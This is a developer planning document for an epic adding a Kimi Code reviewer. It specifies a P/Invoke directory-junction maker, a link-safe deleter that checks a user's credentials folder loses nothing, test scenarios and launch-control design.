# PLAN — S4's code half, split into stories: a Kimi Code reviewer row over ACP

> Status: **E4.1–E4.2 implemented 2026-10-15 (feat/kimi-runtime); E4.3–E4.5 not started.** Stories written 2026-10-14; the two
> cornerstones' scenarios and briefs written by Fable 2026-10-14; E4.2 amended by Fable 2026-10-15 (the junction risk
> consultation 7de9430b and the E4.1 review folded in: decisions 9–13, brief §15–§17, S2.41–S2.46; revised the same day
> after the Opus review of f1983923 — B1–B3, M1–M4 taken, E4.3 gains S3.14–S3.17). E4.2 is a `model: fable` spec — a
> coder may start it; E4.3–E4.5 are Opus's.
>
> Parent plan: [PLAN_vibe_and_kimi_runtimes.md](PLAN_vibe_and_kimi_runtimes.md) — §4 **S4**, its code half (the
> measurement half is done: [RESULTS_kimi_confinement.md](../research/RESULTS_kimi_confinement.md) §1–§26). Decisions
> cited here by number (D6, D8b, D10, D14, D15, D16, D18, D19, D20) are the parent's; this document never restates them,
> it says who builds what, in which order, and how it is proved.

## 0. How to read this

**The epic.** S4's code half: a Kimi row added from the preset reviews plans and code through `coai-mcp --ask-acp`,
on a coai-owned `KIMI_CODE_HOME` whose `credentials` is a junction to the person's own folder (D19), in a built
environment, with the model checked twice (D10), writes refused by the shim (D15), and every deleter safe around the
junction. Not this epic: Kimi as a consultant and as a question row (S5), M-K14 (the refresh race — later, by the
owner's decision), and the Unix process-group teardown of the shim (parent §4 S4, the "before the shim launches Kimi on
any host but Windows" bullet: it belongs to the change that lifts D18 for Kimi, and D18 refuses every non-Windows host
here).

**Who does what** ([subagent-models.md](../.agents/conventions/common/subagent-models.md)). Per story: scenarios + brief —
Opus, or **Fable on a cornerstone**; code + tests — Sonnet; review — Opus; fixes — Sonnet. A coder starts a story only
when its SCENARIOS and BRIEF sections are written; E4.1's and E4.2's were written by Fable on 2026-10-14, each with a
*Decisions* list (the reasons), a *Review focus* list for the Opus reviewer, and its deviations from D19 numbered in
§"Where the parent plan and the code disagree".

**Cornerstones: 2 of 2** (Q = ⌈2·5/5⌉ = 2) — E4.1 (junction-safe ownership) and E4.2 (`KimiHome` + `KimiLaunch`):
the credentials junction and the owned home are security judgement — a bug in E4.1 deletes the person's sign-in, a bug
in E4.2 hands Kimi the person's configuration or a path out of its home. The ledger line is in the parent's §4 S4 block.

**The build order is the order below**, and it is strict for E4.1 → E4.2 → E4.3 → E4.4; E4.5 needs only E4.4's
runtime name to exist on the server (it can be written beside E4.4, never merged before it).

**S3 (#811) is on `main` and under this branch.** `feat/kimi-runtime` was rebased on 2026-10-14 onto `origin/main`,
which holds S3 (`ea84af70`). This epic BUILDS ON, never re-writes: the link-safe deleter
(`GitScratch.DeleteEvenIfReadOnly` unlinks a link by its own name and never enters it, clears read-only FOLDERS too),
its red-first test `DeletingAnOwnedTreeNeverEntersALinkTests` (a junction to a read-only file, three shapes),
`OwnedPaths.IsLinkIfThere`, `ConsultantHomes` (`coai-vibe` AND `coai-kimi`), D20's `ConsultantHomeSweep` (which already
walks `coai-kimi/`), `ConsultantPlaces` / `ConversationFolder` with the cross-process `coai-turn.lock`, `TempDir.Dispose`
through the product deleter, and the `vh-*` read-only-folder sweep test in `TempDirsAreSwept`.
**Anchors:** every `file:line` in E4.1 and E4.2 is verified on HEAD `b121cca8` (2026-10-14, after the rebase). E4.3–E4.5's
were taken on `main` 43a5637f before the rebase (a `(S3)` mark there means `origin/feat/vibe-consultant` 6fdf0e09, now
merged) — their coder re-verifies each one on HEAD before citing it; the shapes have not moved, the numbers may have.

**Commands, for every story** (run from the worktree root; never `dotnet test`):

```bash
dotnet build dew_flow_connect_other_ais.slnx -c Debug -m:4
./src_mcp/tests/bin/Debug/net10.0/CoaiMcp.Tests.exe --filter-class "*<TheClass>"      # the story's classes first
./src_mcp/tests/bin/Debug/net10.0/CoaiMcp.Tests.exe                                    # then the whole suite
dotnet format dew_flow_connect_other_ais.slnx --verify-no-changes
cd src_vs_code && npm run typecheck && npm run lint && npm test                        # E4.4 (seeds) and E4.5
node src_vs_code/scripts/generate-feature-availability.mjs --check                     # E4.4 and E4.5
node .agents/conventions/tools/plan-lifecycle.mjs                                      # every story that edits a doc
```

**For every story:** cyclomatic complexity ≤ 4 per method; red first for every behaviour, with the red message written
into the summary; anything a test creates outside its process — a temp folder, a worktree, a branch — is named
`testsToDelete-<what>-<short id>` ([test-leftovers.md](../.agents/conventions/common/test-leftovers.md)), so new
tests use `TempDir.For("testsToDelete-<what>-")`, never a `coai-` product prefix (the existing
`DeletingAnOwnedTreeNeverEntersALinkTests` uses `coai-answers-…`, a prefix `shared/temp-sweep.json` marks `neverSwept`;
leave it, write new ones correctly). **No test ever makes a junction to anything outside its own `testsToDelete-` folder**
— never to the developer's real `~/.kimi-code`: a leftover folder is swept by `Remove-Item -Recurse`, and Windows
PowerShell 5.1's recursive remove walks INTO a junction. A fake person's home is a folder inside the test's own temp
folder, always. Each story adds its CHANGELOG lines under `## Unreleased` and updates the docs it names.

## E4.1 — Junction-safe ownership: making, reading back and disposing of a link into the person's folder

`model: fable` — **cornerstone** (security judgement: the first bug here deletes a person's sign-in). **Spec: Fable,
2026-10-14**; every anchor on HEAD `b121cca8`.

**Goal.** coai can make a directory junction from an owned home to the person's `credentials` folder, read it back and
refuse a wrong target, and dispose of an owned home with verification — and every deleter that can ever meet a `kh-*`
home (or a conversation's `coai-kimi/<id>`) never enters the link and STOPS, saying which name, the moment the person's
folder lost one. Nothing Kimi-specific beyond the shape: no `kimi`, no config, no launch.

**Files and anchors (verified on `b121cca8`).**
- `src_mcp/runners/Files/GitScratch.cs:27-43` (`DeleteEvenIfReadOnly`: a link at the root unlinked `:29-34`, the hand
  walk `:37-40`), `:60-74` (`DeleteEntry`: a link unlinked, a real directory descended, a file deleted), `:81-90`
  (`Unlink`: a directory link by a NON-recursive `Directory.Delete`, a file link by `File.Delete`, told apart by the
  LINK's own attributes — the target never read). The link-safe deleter IS on `main` (S3); this story widens `Unlink`
  (brief §2) and never re-implements the walk.
- `src_mcp/tests/DeletingAnOwnedTreeNeverEntersALinkTests.cs` (137 lines): the fixture — `Target`, a read-only `Secret`,
  `HomeWithALinkAsync` `:51-65`, `TheTargetIsUntouched` `:67-73` — and four cases: the junction at depth 1 and 3
  (`:75-86`), a tree that is itself a link (`:88-98`), a TAMPERED home whose `credentials` is a real folder, deleted
  whole (`:100-113`), read-only folders (`:120-136`). New cases join this class; its `coai-answers-linkdelete-` prefix
  stays (§0).
- `src_mcp/runners/Snapshots/SnapshotLinks.cs:37-48` (`IsLink`, fails closed; `internal` — every new type of this story
  lives in the runners assembly, where it is reachable) and `src_mcp/runners/Files/OwnedPaths.cs:18-32`
  (`IsLinkIfThere`), `:35-36` (`FirstLink`).
- `src_mcp/tests/DirectoryLink.cs:22-34` (the TEST maker: relative `cmd /c mklink /J`; a symlink elsewhere), `:40-46`
  (`Remove`: the link itself, never recursive). It stays the tests' INDEPENDENT oracle for the product's maker (S1.2)
  and does not delegate to it.
- `src_mcp/runners/Worktrees/WorktreePaths.cs:60-88` (`Resolved` / `Target`: `DirectoryInfo.LinkTarget` and
  `ResolveLinkTarget(returnFinalTarget: true)` — the repository already reads a junction's target this way, measured by
  `AReviewRootBehindALinkTests`).
- `src_mcp/runners/Files/HandleRead.cs:282-287` — the runners project's existing `[LibraryImport("kernel32.dll")]` of
  `CreateFileW` (`StringMarshalling.Utf16`, `SetLastError = true`): the P/Invoke shape the junction maker follows;
  `src_mcp/runners/CoaiMcp.Runners.csproj:7` (`IsAotCompatible`), `:14` (`AllowUnsafeBlocks`), `src_mcp/src/CoaiMcp.csproj:15`
  (`PublishAot`).
- `src_mcp/runners/Files/HeldFile.cs:41-55` — not for this story; named so the primitive invents no lock.
- **Every product deleter, each through `GitScratch.DeleteEvenIfReadOnly`, and what it does with an `IOException`:**
  `src_mcp/src/Server/Rounds/RoundScratch.cs:69-82` (`Delete`: the whole round scratch — a reviewer's `kh-*` home lives
  in it, `src_mcp/src/Server/Rounds/RosterBuilder.cs:451` passes it as `OwnedScratch`; a failure → `_note(…)`, "the
  scratch sweep takes it"); `src_mcp/runners/Snapshots/ReviewSnapshot.cs:186-198` (`TryDeleteRoot` → `_note`);
  `src_mcp/runners/Snapshots/ReviewSnapshots.cs:412-424` (`TryDelete` → `note`); `src_mcp/src/Server/PanelService.cs:1342`
  (the alias), `:1376-1389` (`PruneOldAnswerDirs`, the six-hour clock), `:1416-1440` (`PruneOldScratchDirs`; its
  `catch (IOException)` at `:1433-1436` is SILENT — brief §3); `src_mcp/src/Server/Consultation/ConsultCheckScratch.cs:107-120`
  (`Delete` → `warn`); `src_mcp/src/Server/QuestionConsult/QuestionRowLaunch.cs:353-368` (`Remove` → `log.Debug` — brief §3);
  `src_mcp/runners/Vibe/VibeRuntime.cs:116-126` (`DeleteQuietly`, swallowed — a throwaway probe home that never holds a
  link); `src_mcp/runners/Vibe/VibeLaunch.cs:306-326` (`Attempt.Dispose`, the export folder, swallowed — never a link);
  D20's `src_mcp/src/Server/Consultation/ConsultantHomeSweep.cs:157-186` (`Removed`: the cross-process `coai-turn.lock`
  taken `:162`, every in-process turn `:169`, `DeleteAllBut` `:175` → the deleter per entry `:189-203`, then the folder
  `:178`; a failure → `warn` `:117`), on the beat (`ConsultationService.cs:283`) and from `close_consult` (`RemoveNow`
  `:72-84`, called at `ConsultationService.cs:252`); `src_mcp/tests/TempDir.cs:39-51` (the tests' own `Dispose`, through
  the deleter, swallowed — brief §3).
- **The three RAW recursive deletes left in product code**, none of which can meet a coai junction:
  `src_mcp/src/Server/Escalations.cs:386` (an escalation's plan folder), `src_mcp/runners/Worktrees/ReviewTreeRoot.cs:201`
  and `src_mcp/runners/Worktrees/WorktreeManager.cs:269` (git worktrees). Pinned as a list by S1.11, proven safe by S1.10.
- The TEST sweeps: `src_mcp/tests/TempDirsAreSwept.cs:58-60` (the assembly fixture: `PanelService.PruneOldScratchDirs`
  over `coai-*`), its own fixture roots removed by raw `Directory.Delete(root, recursive: true)` at `:132`, `:152`, `:174`,
  `:195` (roots that never hold a link — S1.10 proves the call safe anyway); `src_vs_code/scripts/sweepTemp.mjs:65-72`
  (`removed`: `rmSync(target, { recursive: true, force: true })`), called from `src_vs_code/scripts/run-tests.mjs:101-109`
  (`sweepFirst`), tested by `src_vs_code/src/test/sweepTemp.test.mjs` (pure `toSweep` rows, `sweep` with an injected `io`).
- `src_mcp/tests/ConsultantHomeSweepTests.cs:141-146` — D20's existing junction case
  (`AnOrphanedKimiHome_PastTheWindow_IsGone_JunctionAndAll_AndThePersonsFolderKeepsItsFile`): the sweep already meets a
  `credentials` junction; only the LOSS case is new there (S1.8).
- `src_mcp/tests/TempDir.cs:29-30` (`For(prefix)` → `Directory.CreateTempSubdirectory`): new tests call
  `TempDir.For("testsToDelete-<what>-")`.
- The probe's measured shapes: `scripts/lib/kimi-home.mjs:107-126` (`disposeOwnedHome`: the link removed by its own
  name, verified gone, the target's names compared with those read before, only then the rest — "throws, and deletes
  nothing more, the moment a check fails") and `scripts/lib/kimi.mjs:179-182` (`junction()`: `%SystemRoot%\System32\cmd.exe
  /d /c mklink /J`).

**Decisions (Fable, 2026-10-14) — each with its reason; the deviations from D19 are items 9–11 of §"Where the parent plan
and the code disagree".**

1. **The junction is made by `DeviceIoControl(FSCTL_SET_REPARSE_POINT)` through P/Invoke, not by `cmd.exe`.** The two
   differ in exactly one security property: `cmd.exe /d /c mklink /J "<link>" "<target>"` passes the person's PROFILE
   path through cmd's quoting rules, where `&`, `^`, `%` or an embedded quote in a user name changes the command — the
   probe's form was measured on one profile path, not on the grammar. The P/Invoke takes the path as UTF-16 bytes,
   starts no process, needs no privilege (a mount point is unprivileged where a symlink needs Developer Mode) and the
   runners project already carries an AOT-safe `CreateFileW` import (`HandleRead.cs:285`): three imports, about eighty
   lines, no shell. The read-back AFTER making it (`DirectoryInfo.LinkTarget` equals the target) is what makes the
   maker's correctness provable whichever way it was made — and S1.2 compares the product's junction with `mklink`'s on
   the same target.
2. **The verified disposal is the one deleter, widened — not a second deleter called "first".** D19's order
   (`credentials` first by its own name, verify, then the rest) answers a recursive remove that would FOLLOW the link.
   `GitScratch.DeleteEvenIfReadOnly` has no step that follows a link: it unlinks a link where it meets it and descends
   only a real directory (S3, measured). So the order is immaterial, and the one thing D19's disposal adds — *verify the
   person's folder lost nothing, and stop the moment it did* — goes INSIDE the deleter's `Unlink`: the target's entry
   names are read through the link's own `LinkTarget` before the unlink and again after, and a name that is gone throws
   `LinkTargetLostException : IOException` naming it; the walk stops there (nothing more is deleted) and every caller's
   existing `catch (IOException)` carries the sentence to its log. The one deleter has the belt, so no caller can forget
   it — a separate `DisposeJunctionFirst` would have been every future caller's duty (S5's question row and consultant
   check among them). A sweep that meets the same tree later finds the link already gone and proceeds. Deviation 10.
   *Plan round on #817 (accepted, 2026-10-14): belt AND braces — where a caller KNOWS it holds a Kimi home, D19's
   original order is ALSO done explicitly by E4.2's `KimiHome.Dispose` (the junction first by its own name, the
   target's names and count verified, only then `GitScratch`); this in-deleter check stays as the second belt, and the
   only one for callers that do not know what they delete (the six-hour sweep, the snapshots, `TempDir`). E4.2 brief
   §14, scenarios S2.36–S2.40.*
3. **A `credentials` that is a REAL folder is the tree's own and goes with it** (S3's case `:100-113` stays the rule):
   there is no link to verify, the deleter never leaves coai's tree, and a copied secret inside coai's tree is better
   deleted than kept. A home whose junction was ALREADY removed is the same case. Neither is a stop.
4. **Which callers stay on the bare deleter: every one that does not know what it deletes** — the six-hour sweep, the
   snapshots, the tests' `TempDir`, and `RoundScratch`'s delete of the whole scratch — because after §2 the bare deleter
   IS a verified one. The callers that KNOW they hold a Kimi home — the round's scratch for its `kh-*` children (wired
   by E4.4), D20's sweep and `close_consult` for `coai-kimi/<id>` (wired by E4.2), S5's question row and consultant check
   — call E4.2's `KimiHome.Dispose` FIRST (the plan round's accepted finding), then the bare deleter. What THIS story
   changes in every caller is only that a loss is LOUD where it was swallowed (brief §3). `PruneOldScratchDirs`,
   `ConsultantHomeSweep` and `RoundScratch` each get the scenario that proves it (S1.7, S1.8, S1.12).
5. **Windows only.** `Junctions.Make` on any other host answers the D18 sentence and makes nothing; the deleter's
   verification is host-neutral (a symlink's `LinkTarget` reads the same way) and runs everywhere.

**BRIEF.**
1. **`src_mcp/runners/Files/Junctions.cs`** — `public static partial class Junctions` (partial for the generated imports):
   - `public static string Refusal(HostKind host, string link, string target)` — the FIRST of: `host != HostKind.Windows`
     → `a directory junction is made on Windows only; Kimi is refused on a {HostKinds.Word(host)} host until it is
     measured there (D18 of todo/PLAN_vibe_and_kimi_runtimes.md)`; `target` not `Path.IsPathFullyQualified`, or beginning
     with `\\` (UNC, `\\?\UNC\`, `\\wsl$`), or not `<letter>:\`-rooted → `{target} is not a local drive path, and a junction
     cannot point at a network or roaming location — coai refuses to link the Kimi sign-in from there (D19)`;
     `!Directory.Exists(target)` → `{target} does not exist`; `SnapshotLinks.IsLink(target)` → `{target} is itself a
     link, and coai never chains links (D19)`; anything at `link` (`File.Exists || Directory.Exists ||
     OwnedPaths.IsLinkIfThere`) → `{link} already exists, and a junction is only ever made at a fresh path`; a target over
     32 000 characters → refused with the number (the reparse buffer's bound); else empty.
   - `public static string Make(HostKind host, string link, string target)` — `Refusal` first; then
     `Directory.CreateDirectory(link)`; `CreateFileW(link, GENERIC_WRITE, 0, null, OPEN_EXISTING,
     FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, 0)`; a `REPARSE_DATA_BUFFER` laid out by hand in a
     `byte[]` (no struct marshalling): tag `IO_REPARSE_TAG_MOUNT_POINT` `0xA0000003`, `SubstituteName` = `\??\` + the
     target's full path without a trailing separator, `PrintName` = the target's full path, both UTF-16 without a BOM,
     the four offset/length fields in BYTES and `ReparseDataLength` computed; `DeviceIoControl(handle,
     FSCTL_SET_REPARSE_POINT = 0x000900A4, buffer, length, 0, 0, out _, 0)`; the handle disposed; then the READ-BACK:
     `OwnedPaths.IsLinkIfThere(link) && SameFolder(Target(link), target)` — else the half-made link is removed by its
     own name (`Directory.Delete(link, recursive: false)`) and the answer is `the junction at {link} was made but reads
     back as '{read}', not {target} — removed again, the launch is refused`. Any Win32 failure: the empty directory
     removed, `the junction at {link} could not be made: {Marshal.GetPInvokeErrorMessage(error)}`. The imports
     (`CreateFileW`, `DeviceIoControl`; `CloseHandle` through `SafeFileHandle`) are `[LibraryImport("kernel32.dll",
     SetLastError = true)]` in the shape of `HandleRead.cs:282-287`; if `HandleRead`'s `CreateFileW` can be made
     `internal` and shared, share it (reuse-first, move 2) — never a third import of one function.
   - `public static string Target(string link)` — `new DirectoryInfo(link).LinkTarget` (ONE level, never
     `ResolveLinkTarget`: no chaining), made absolute against the link's parent when relative,
     `Path.TrimEndingDirectorySeparator(Path.GetFullPath(…))`; empty when the path is no link or cannot be read.
   - `public static bool SameFolder(string a, string b)` — both through `GetFullPath` + `TrimEndingDirectorySeparator`,
     `OrdinalIgnoreCase` on Windows, `Ordinal` elsewhere.
   - `internal static string Make(HostKind host, string link, string target, Func<string, string> readBack)` — S1.6's seam;
     the public overload passes `Target`.
2. **`GitScratch.DeleteEvenIfReadOnly` widened at `Unlink` (`GitScratch.cs:81-90`).** For a DIRECTORY link:
   `target = Junctions.Target(link)`; when it is non-empty and listable, `before` = the target's direct entry NAMES
   (`Directory.EnumerateFileSystemEntries(target)` → `Path.GetFileName`, an ordinal set); the unlink as today; then
   `OwnedPaths.IsLinkIfThere(link) || Directory.Exists(link)` → `throw new LinkTargetLostException($"{link} still exists
   after its unlink — nothing more was deleted")`; `after` read the same way; `missing = before.Except(after)` non-empty →
   `throw new LinkTargetLostException($"the folder {target} that {link} pointed at lost {string.Join(", ", missing)}
   during the unlink — nothing more was deleted; check that folder before deleting {link}'s tree again")`. For a FILE
   link: `File.Exists(target)` before and after, the same exception when it is gone. A target that cannot be read
   (dangling, unreadable) → unverified, nothing said (the unlink by name was always safe). `public sealed class
   LinkTargetLostException(string message) : IOException(message)` beside it. CC ≤ 4: `Unlink` → `UnlinkDirectory` /
   `UnlinkFile` / `Verify(before, after, link, target)`. The remarks `:18-26` gain: *and the target of every link is
   checked to have lost nothing, or the deletion stops with the names (E4.1 of PLAN_vibe_and_kimi_runtimes_E4.md)*.
   An `internal static Action<string>? AfterUnlink` seam (test only, null in the product) runs between the unlink and
   the second read — S1.7 and S1.8 need the loss to happen in that window.
3. **A loss is never swallowed.** `PanelService.PruneOldScratchDirs` gains `Action<string>? warn = null` and
   `catch (LinkTargetLostException e) { warn?.Invoke(e.Message); }` BEFORE the silent `catch (IOException)` (`:1433`);
   `PruneOldAnswerDirs` passes the service's warning logger; the test sweep (`TempDirsAreSwept.cs:58-60`, `:112`, …) passes
   nothing. `QuestionRowLaunch.Remove` (`:353-368`): `catch (LinkTargetLostException e) { log.Warning(…) }` before its
   `Debug`. `TempDir.Dispose` (`TempDir.cs:39-51`): a `LinkTargetLostException` is RE-THROWN — in a test a lost target is a
   failing test, never a leftover. Every other caller already warns or notes the message as it is.
4. **Tests' junctions**: every new test makes its junction INSIDE its own `TempDir.For("testsToDelete-…")` folder, to a
   sibling folder in the same `TempDir` — never to `~/.kimi-code`, never to another test's folder (§0).
5. **Docs**: `research/module_runners.md` — a *Files* paragraph: the junction maker (P/Invoke, the read-back, the
   refusals), the deleter's verification and `LinkTargetLostException` with what each caller does with it;
   `research/module_tests.md` — the junction tests, S1.13's verdict on Node's `rmSync`, and the rule that no test
   junctions outside its own `testsToDelete-` folder. `src_vs_code/CHANGELOG.md` under `## Unreleased` only if S1.13
   changes `sweepTemp.mjs`; the server has no CHANGELOG file (release-please writes its notes from the commits).

**SCENARIOS** (each one a test; red first — "expected red today" is what HEAD does. A class that does not exist is a
COMPILE red: stub the type to return `string.Empty`/do nothing first and watch the behavioural red named here).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S1.1 `AJunctionIsMade_AndReadsBackAsItsTarget` (`JunctionsTests`, Windows; elsewhere only S1.4 runs) | `testsToDelete-junc-` holding `target/secret.json` (read-only) | `Junctions.Make(HostKind.Windows, <dir>/link, <dir>/target)` | empty; `File.GetAttributes(link)` has `ReparsePoint` and `Directory`; `Junctions.Target(link)` `SameFolder`s the target; `File.ReadAllBytes(link/secret.json)` are the target's bytes; `DirectoryLink.Remove(link)` leaves `target/secret.json` with its bytes and attribute | stub returning empty: *Expected … HasFlag(ReparsePoint) to be true, but found False* |
| S1.2 `TheProductsJunction_IsWhatMklinkMakes` | one link by `Junctions.Make`, one by `DirectoryLink.MakeAsync`, same target | `Target()` and `new DirectoryInfo(x).LinkTarget` of each; `GitScratch.DeleteEvenIfReadOnly` on a tree holding both | equal pairs; both removed by name; `TheTargetIsUntouched` | the product link's `LinkTarget` null |
| S1.3 `ARefusalBeforeAnythingIsMade` (Theory: target `\\server\share\k`; `\\wsl$\Ubuntu\home\k`; relative `k`; a target that does not exist; a target that is itself a junction (`DirectoryLink`); a link path that is a folder / a file / a link already; a 33 000-character target) | — | `Junctions.Refusal`, then `Make` | the row's sentence (as quoted in brief §1); NOTHING exists at `link` afterwards, not even an empty folder | stub: empty sentence; after a stub that creates the folder, `Directory.Exists(link)` true |
| S1.4 `ANonWindowsHost_IsRefusedWithTheD18Sentence` (pure; every CI) | `HostKind.Linux`, `Wsl`, `MacOs`, `Other` | `Refusal`, `Make` | names `D18` and the host's word; nothing made | empty |
| S1.5 `TheReadBackIsNormalised` | a target spelled `c:\…\TARGET\` against a link made to `C:\…\target` | `Make` | empty — `SameFolder` ignores case and the trailing separator on Windows | refusal "reads back as" |
| S1.6 `AReadBackThatNamesAnotherFolder_UnlinksAndRefuses` | the internal seam's `readBack` answering a sibling folder | `Make` | the "reads back as … removed again" sentence; `link` absent; target intact | the link kept |
| S1.7 `ALinkWhoseTargetLostAName_StopsTheDeletion_AndSaysWhich` (`DeletingAnOwnedTreeNeverEntersALinkTests`) | `home/credentials` → junction to `persons-credentials/{kimi-code-env.json, kimi-code.json}`; `home/config.toml`, `home/sessions/index.jsonl`; `GitScratch.AfterUnlink` deletes `persons-credentials/kimi-code.json` | `DeleteEvenIfReadOnly(home)` | throws `LinkTargetLostException` naming `kimi-code.json` and `persons-credentials`; `home/config.toml` and `home/sessions/index.jsonl` STILL EXIST; the link is gone; `TheTargetIsUntouched` for the other file | no throw; the home gone whole |
| S1.8 `TheSweepSaysALoss_AndGoesOn` (`ConsultantHomeSweepTests`) | an orphaned `coai-kimi/<id>` past the window whose junction target loses a file through the seam | `ConsultantHomeSweep.Sweep` | `warn` received the loss sentence; the count excludes the folder; the next `Sweep` (seam off) removes it | no warning, the folder gone |
| S1.9 `ADanglingLink_AndAFileLink` (Theory; the file-symlink row skipped where the OS refuses to make one) | a junction whose target folder was deleted before the tree; a file symlink (`File.CreateSymbolicLink`) to a read-only file | `DeleteEvenIfReadOnly` | the dangling junction removed, nothing thrown; the file link removed, the target file kept with bytes and attribute | (dangling: green on HEAD — pins it; the file row red if `Verify` treats a file target as a folder: *DirectoryNotFoundException*) |
| S1.10 `DotNetsRecursiveDelete_DoesNotEnterAJunction` | a tree with `a/credentials` → junction to a folder holding a read-only file | `Directory.Delete(tree, recursive: true)` | the tree gone; the target's file keeps bytes AND attribute | (expected green — pins the three raw sites' safety; if RED, those three sites switch to the shared deleter in this story and brief §3 says so) |
| S1.11 `EveryProductDeleterIsTheSharedOne` (a source scan in the `TempDirsAreSwept.TempPrefixesIn` shape) | every `.cs` under `src_mcp/src` and `src_mcp/runners` | the set of files holding `Directory.Delete(` with `recursive: true` or `, true)` | exactly `{Escalations.cs, ReviewTreeRoot.cs, WorktreeManager.cs}`; a fourth is red naming its path | (green — pins the list) |
| S1.12 `ARoundsScratchHoldingAKimiHomeWithAJunction_IsSwept_AndThePersonsFolderKeepsItsFile` (`TempDirsAreSwept`) | `testsToDelete-sweep-kh-/coai-answers-x/kh-0123456789/home/credentials` → junction to `…/persons/` holding a read-only `kimi-code-env.json`; the scratch's last write three days ago | `PanelService.PruneOldScratchDirs(root, -1 day, ["coai-answers-*"])` | the scratch gone; the file: bytes and `ReadOnly` intact; a second arm with the loss seam: `warn` holds the sentence, the scratch left | (green on HEAD through S3's deleter — pins the sweep by name; the warn arm red: the collector empty) |
| S1.13 `a junction inside a leftover is removed by its own name, never entered` (`sweepTemp.test.mjs`; Windows only — `test.skip` elsewhere, with a symlink twin that runs everywhere) | a `testsToDelete-sweep-` folder under `os.tmpdir()` holding `coai-left/kh/home/credentials` (made with `execFileSync(path.join(process.env.SystemRoot, 'System32', 'cmd.exe'), ['/d', '/c', 'mklink', '/J', link, target])`) → `persons/secret.json` read-only; `rule = { prefix: 'coai-', keepMinutes: 0, neverSwept: [] }` | `sweep(folder, Date.now() + 60_000, rule)` | `removed === 1`; `persons/secret.json` exists with its bytes and its read-only bit. If RED (the file gone or writable): `removed()` first unlinks every link in the tree by name (`lstatSync(p).isSymbolicLink()` → `rmdirSync`/`unlinkSync`) before `rmSync` — then green | UNKNOWN — the measurement IS the scenario; the verdict goes into `research/module_tests.md` either way |
| S1.14 `ADisposalOfAHomeMadeWithTheProductsJunction_LeavesThePersonsFolderWhole` | `Junctions.Make` into `kh-x/home/credentials` → `persons/` with two read-only files; `config.toml` and `sessions/…` in the home | `TempDir.Dispose` (the tests' path) and `GitScratch.DeleteEvenIfReadOnly` | gone; both files keep bytes and attribute; the folder's names unchanged | (green after S1.1) |

**Review focus (Opus).** (1) `Junctions.Make`'s failure paths: is the empty directory ALWAYS removed after a failed
`DeviceIoControl` or a failed read-back — can a half-made link survive any branch? (2) The `REPARSE_DATA_BUFFER`
layout: `ReparseDataLength`, the four name offsets/lengths in BYTES, the `\??\` prefix on the substitute name only, no
trailing separator, UTF-16 — compare with S1.2's `mklink` link (`fsutil reparsepoint query`) if in doubt. (3) `Unlink`'s
verification reads the target THROUGH `LinkTarget`, never through the link path (which would be entering it); a listing
is a read, never a write; `before`/`after` compared by names only. (4) `LinkTargetLostException` really stops the walk —
no `finally` continues deleting siblings. (5) No caller swallows it any more (brief §3), and `TempDir` re-throws.
(6) Every test's junction target is inside the test's own `testsToDelete-` folder (grep the diff for `MakeAsync(` and
`Junctions.Make(`). (7) CC ≤ 4 in `Make`, `Refusal`, `Unlink`. (8) S1.13's verdict is recorded whichever way it went.

**Docs.** As brief §5.

## E4.2 — `KimiHome` + `KimiLaunch`: the owned home, its config, its validation, the built environment, one launch control

`model: fable` — **cornerstone** (security judgement: what of the person's reaches Kimi, and through which path). **Spec:
Fable, 2026-10-14**; every anchor on HEAD `b121cca8`.

**Goal.** Every Kimi launch is checked and built by ONE control, `KimiLaunch` — the Vibe shapes (`VibeLaunch`,
`VibeHome`, `VibeHomeTurns`) with the inversions D19 names: the owned home (`home/` = the `credentials` junction from
E4.1 + ONE coai-written `config.toml`) beside an empty `os/`; the person's OAuth slot READ from their `config.toml`,
never copied; the model block from the person's own `[models."<id>"]` or a pinned `shared/kimi-model-blocks.json`;
validation before every launch; the built environment (`ProcessEnvironment.Minimal`'s names + `KIMI_CODE_HOME` +
`KIMI_CODE_NO_AUTO_UPDATE=1` + `USERPROFILE`/`HOME`/`HOMEDRIVE`/`HOMEPATH` → `os/` + `PATH` beginning with the person's
`~/.kimi-code/bin`); `rg` and `fd` found before any process; the model pre-check against the curated `kimi-code/*` list
(D10); `kimi --version` in the built environment against `KimiAcpProfile.MeasuredVersions` — warn and run (owner,
2026-10-13); the home's turn in-process and, across processes, one launch per credentials target. No `KimiRuntime` yet
(E4.4) and no shim change (E4.3): E4.2 is the library both of them call.

**Files and anchors (verified on `b121cca8`).**
- `src_mcp/runners/Vibe/VibeLaunch.cs` — `VibeModels` `:15-29` (`Default`, `Curated`, `SeenOn`: the shape `KimiModels`
  repeats); `HostRefusal` `:81-86` and the private `RunsInWsl` `:88-96` (decision 7 shares it); `EnvironmentRefusal`
  `:105-108`, `Confined` `:129-130`, `CarriesTheThree` `:133-137`; `Built` `:115-126`; `ModelRefusal` `:144-148`;
  `VersionIn` `:151-152` with `VersionPattern` `:73`; `TakeAsync` `:162-187` (the order: before the turn — host,
  environment, model, home made; the turn; inside — the shape, the version, the shape again, the verdict; a throw inside
  gives the turn back `:179-183`); `HomeVerdict` `:190-196`; `AgainstAsync` `:213-226`; `Given` `:228-233`; `FirstOf`
  `:235-237`; `HomeMade` `:239-252`; `VersionAsync` `:255-270` (`Win32Exception` → `VendorDiagnosis.InstallCure`);
  `Verdict` `:278-282`; `VersionWarning` `:288-289`; `Unmeasured` `:291-295` (the sentence brief §12 moves); `Named`
  `:301`; `Attempt` `:306-326`.
- `src_mcp/runners/Vibe/VibeHome.cs:36-62` (`Refusal` / `Checked`: not there → empty; the home itself a link → refused;
  a read failure → refused rather than started on a home nobody checked `:58-61`), `:64-77` (`FirstProblem`), the hand
  walk `Inside` / `Judge` / `Folder` `:80-115` that never follows a link, `Sentence` `:118-122`. The Kimi check repeats the
  WALK and inverts the rule at one path.
- `src_mcp/runners/Vibe/VibeHomeTurns.cs:22-36` (`TakeAsync`), `:47-61` (`TryTake`), remarks `:43-45` ("Kimi's homes
  share this, never a copy of it") — used AS IS, keyed by the owned ROOT. No rename in this story: a rename touches the
  sweep and `ConsultantPlaces` for a name alone — propose it in the summary, do not do it.
- `src_mcp/runners/Vibe/VibeRuntime.cs:101-113` (`ProbeVersionAsync` — E4.4 repeats it), `:157-158` (`HomeFor`: `vh-` +
  10 hex of SHA-256 → `kh-`), `:164-165` (`Short`, private — brief §8 shares it).
- `src_mcp/runners/Reviewers/LaunchTurn.cs:17-63` — `Holding(held, warning, cliVersion)` `:42`; `Warning` is a STRING
  `:48`; `CliVersion` `:51`. The carrier stays (decision 3).
